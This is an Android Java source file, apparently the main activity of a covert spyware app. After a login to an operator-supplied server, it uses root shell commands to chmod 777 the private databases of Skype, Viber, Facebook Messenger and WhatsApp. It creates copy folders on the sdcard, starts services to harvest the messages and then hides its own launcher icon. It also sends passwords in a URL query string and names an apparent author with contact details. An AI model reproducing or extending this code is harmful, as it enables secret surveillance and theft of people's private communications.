package voluntaty.com.baseroot;



/* e-mail: superslon74@gmail.com
 * skype: superslon74
 * шаманский геннадий александрович
 */


import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.accounts.Account;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.Toast;
import android.accounts.Account;
import android.accounts.AccountManager;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperOne;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.channels.FileChannel;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

/*
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.database.sqlite.SQLiteOpenHelper;
*/
public class MainActivity extends Activity {
    private String valid_email;
    private ProgressDialog dialog;
    private String valid_url;
    public String URL_HTTP=null;

    Cursor c = null;
    //	int error1=1;
    int error2=1;
    int error3=1;
    int error4=1;
    int error5=0;

    String login=null;
    String email=null;
    String password=null;

    EditText edittext1 = null;
    EditText edittext2 = null;
    EditText edittext3 = null;
    EditText edittext4 = null;

    Button button1=null;

    CheckBox checkBox1 = null;
    int flag1=1;
    CheckBox checkBox2 = null;
    int flag2=0;
    CheckBox checkBox3 = null;
    int flag3=0;
    CheckBox checkBox4 = null;
    int flag4=0;

    private DataHelper dh;
    public DataHelper getDataHelper() {
        return new DataHelper(this);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

// AccountManager manager =  AccountManager.get(this);
	/*
		//	 (AccountManager)getSystemService(ACCOUNT_SERVICE);
 		 Account[] accounts = manager.getAccounts();
*/

        edittext2 = (EditText) findViewById(R.id.edittext2);
        edittext2.addTextChangedListener(new TextWatcher() {

            @Override
            public void onTextChanged(CharSequence s, int start, int before,
                                      int count) {
                // TODO Auto-generated method stub

            }

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count,
                                          int after) {
                // TODO Auto-generated method stub

            }

            @Override
            public void afterTextChanged(Editable s) {
                // TODO Auto-generated method stub

                // TODO Auto-generated method stub
                Is_Valid_Email(edittext2); // pass your EditText Obj here.
            }

            public void Is_Valid_Email(EditText edt) {
                if (edt.getText().toString() == null) {
                    edt.setError("Invalid Email Address");
                    error4=1;
                    valid_email = null;
                } else if (isEmailValid(edt.getText().toString()) == false) {
                    edt.setError("Invalid Email Address");
                    error4=1;
                    valid_email = null;
                } else {
                    error4=0;
                    valid_email = edt.getText().toString();
                }
            }

            boolean isEmailValid(CharSequence email) {
                return android.util.Patterns.EMAIL_ADDRESS.matcher(email)
                        .matches();
            } // end of TextWatcher (email)
        });
        edittext3 = (EditText) findViewById(R.id.edittext3);
        edittext4 = (EditText) findViewById(R.id.edittext4);
        button1 = (Button) findViewById(R.id.button1);

        checkBox1 = (CheckBox) findViewById(R.id.checkBox1);
        checkBox1.setChecked(true);
        checkBox1.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag1=1;
                     } else {
                    flag1=0;
                           }
            }
        });

        checkBox2 = (CheckBox) findViewById(R.id.checkBox2);
        checkBox2.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag2 = 1;
                } else {
                    flag2 = 0;
                }
            }
        });

        checkBox3 = (CheckBox) findViewById(R.id.checkBox3);
        checkBox3.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag3 = 1;
                } else {
                    flag3 = 0;
                }
            }
        });

        checkBox4 = (CheckBox) findViewById(R.id.checkBox4);
        checkBox4.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    flag4 = 1;
                } else {
                    flag4 = 0;
                }
            }
        });




        edittext4.addTextChangedListener(new TextWatcher() {

            @Override
            public void onTextChanged(CharSequence s, int start, int before,
                                      int count) {
                // TODO Auto-generated method stub

            }

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count,
                                          int after) {
                // TODO Auto-generated method stub

            }

            @Override
            public void afterTextChanged(Editable s) {
                // TODO Auto-generated method stub

                // TODO Auto-generated method stub
                Is_Valid_Email(edittext4); // pass your EditText Obj here.
            }

            public void Is_Valid_Email(EditText edt) {
                if (edt.getText().toString() == null) {
                    edt.setError("Invalid URL Address");
                    error5=1;
                    valid_url = null;
                } else if (isEmailValid(edt.getText().toString()) == false) {
                    edt.setError("Invalid URL Address");
                    error5=1;
                    valid_url = null;
                } else {
                    error5=0;
                    valid_url = edt.getText().toString();
                }
            }

            boolean isEmailValid(CharSequence email) {
                return android.util.Patterns.WEB_URL.matcher(email)
                        .matches();
            } // end of TextWatcher (email)
        });



        button1.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {

                URL_HTTP = edittext4.getText().toString();

                email = edittext2.getText().toString();
                if (email.length() > 0) {
                    error2 = 0;
                } else {
                    Toast.makeText(getApplicationContext(), "Ввели не корректный Email", Toast.LENGTH_LONG).show();
                    error2 = 1;
                }

                password = edittext3.getText().toString();

                if (error2 == 0) {

                    if (password.length() > 0) {
                        error3 = 0;
                    } else {
                        Toast.makeText(getApplicationContext(), "Вы не ввели пароль!", Toast.LENGTH_LONG).show();
                        error3 = 1;
                    }
                }

                if (error2 == 0 && error3 == 0 && error4 == 0 && error5 == 0) {

                    dh = null;
                    dh = getDataHelper();
                    dh.InsertUrl_Http(URL_HTTP);
                    dh.InsertEmail(email);
                    dh.InsertLogin(login);
                    dh.InsertPassword(password);
                    dh = null;
                    //Toast.makeText(getApplicationContext(),"Вы вошли!", Toast.LENGTH_LONG).show();
                    //	 Toast.makeText(getApplicationContext(),"Вы вошли в чистему!", Toast.LENGTH_LONG).show();
                    new RequestTask().execute(URL_HTTP, email, password);

                } else {

                    Toast.makeText(getApplicationContext(), "Вы ввели неправильные данные!", Toast.LENGTH_LONG).show();
                }

            }
        });


    }


    public void hideIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName("voluntaty.com.baseroot","voluntaty.com.baseroot.MainActivity");
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }


    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Start the  service
    public void startNewService() {

        AccountManager am = AccountManager.get(this); // current Context
        //AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE); // видел такой способ

        Account[] accounts = am.getAccountsByType("com.skype.contacts.sync");

        String nameaccount=null;
        nameaccount=accounts[0].name;

        setpermission("/data");
        setpermission("/data/data");

        dh=null;
        dh = getDataHelper();

        if(flag1==1){
            dh.insertServiceskype("1");

            setpermission("/data/data/com.skype.raider");
            setpermission("/data/data/com.skype.raider/files");
            setpermission("/data/data/com.skype.raider/files/" + nameaccount);
            setpermission("/data/data/com.skype.raider/files/" + nameaccount + "/main.db");
            //    setpermission("/data/data/com.skype.raider/databases/skypeRingtoneDB.db");
//        setpermission("/sdcard");
            setmkdir("/sdcard/copyskype");
            setpermission("/sdcard/copyskype");
            startService(new Intent(this, ServiceSkype.class));
                       }

        if(flag2==1){
            dh.insertServiceviber("1");
            setpermission("/data/data/com.viber.voip");
            setpermission("/data/data/com.viber.voip/databases");
            setpermission("/data/data/com.viber.voip/databases/viber_messages");
            setmkdir("/sdcard/copyviber");
            setpermission("/sdcard/copyviber");
           startService(new Intent(this, ServiceViber.class));
       //    startService(new Intent(this, ServiceViberTwo.class));
                      }
        if(flag3==1) {
            dh.insertServicefasebook("1");
            dh.insertServicefasebookusers("1");
            setpermission("/data/data/com.facebook.orca");
            setpermission("/data/data/com.facebook.orca/databases");
            setpermission("/data/data/com.facebook.orca/databases/threads_db2");
      setmkdir("/sdcard/copyfasebook2");
      setpermission("/sdcard/copyfasebook2");
            startService(new Intent(this,ServiceFasebook.class));
            startService(new Intent(this,ServiceFasebookUsers.class));
        }

        if(flag4==1) {
            dh.insertServiceWatsapp("1");
            setpermission("/data");
            setpermission("/data/data");
            setpermission("/data/data/com.whatsapp");
            setpermission("/data/data/com.whatsapp/databases");
            setmkdir("/sdcard/copywatsapp");
            setpermission("/sdcard/copywatsapp");
  //      Toast.makeText(getApplicationContext(),"  ватсап !!  ", Toast.LENGTH_LONG).show();
       //     startService(new Intent(this,ServiceWatsapp.class));
            startService(new Intent(this,ServiceWatsapp.class));
           startService(new Intent(this,ServiceWatsappTwo.class));

        }

       dh=null;
        hideIcon();
        //       Toast.makeText(getApplicationContext(),"Тест успешный!", Toast.LENGTH_LONG).show();
        finish();
    }


    class RequestTask extends AsyncTask<String, String, String> {
        private String str2="";

        @Override
        protected String doInBackground(String... params) {

            try {
                // Ñ�Ð¾Ð·Ð´Ð°ÐµÐ¼ Ð·Ð°Ð¿Ñ€Ð¾Ñ� Ð½Ð° Ñ�ÐµÑ€Ð²ÐµÑ€
                DefaultHttpClient hc = new DefaultHttpClient();

                HttpGet postMethod = new HttpGet(params[0]+"/index.php/api/login_ok?email="+params[1]+"&password="+params[2]+"");

                postMethod.setHeader("Content-Type", "text/plain; charset=utf-8");
                postMethod.setHeader("Expect", "100-continue");

                // Ð¿Ð¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ð¾Ñ‚Ð²ÐµÑ‚ Ð¾Ñ‚ Ñ�ÐµÑ€Ð²ÐµÑ€Ð°
                HttpResponse response = hc.execute(postMethod);
                HttpEntity entity = response.getEntity();
                String content = EntityUtils.toString(entity);
                // Ð¿Ð¾Ñ�Ñ‹Ð»Ð°ÐµÐ¼ Ð½Ð° Ð²Ñ‚Ð¾Ñ€ÑƒÑŽ Ð°ÐºÑ‚Ð¸Ð²Ð½Ð¾Ñ�Ñ‚ÑŒ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€Ñ‹
                str2=content.toString().trim();
                //		Toast.makeText(getApplicationContext(), "  "+str, Toast.LENGTH_LONG).show();


            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }

            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //	dialog.dismiss();
            super.onPostExecute(result);

            if(str2.equals("error"))
            {
                Toast.makeText(getApplicationContext(),"Вы ввели незарегистрированный email или пароль!\nПовторите ввод пожалуйста!", Toast.LENGTH_LONG).show();
            }
            else
            if(str2.length()<1)
            {
                Toast.makeText(getApplicationContext(),"Вы ввели неправильный адрес нашего сайта!\nПовторите ввод пожалуйста!", Toast.LENGTH_LONG).show();

            }


            else
            {

                //	Toast.makeText(getApplicationContext(),"Ð’Ñ�Ðµ Ð¾Ðº", Toast.LENGTH_LONG).show();

                startNewService();
                //		Toast.makeText(getApplicationContext(),"Старт Сервиса!", Toast.LENGTH_LONG).show();

            }

        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }

}
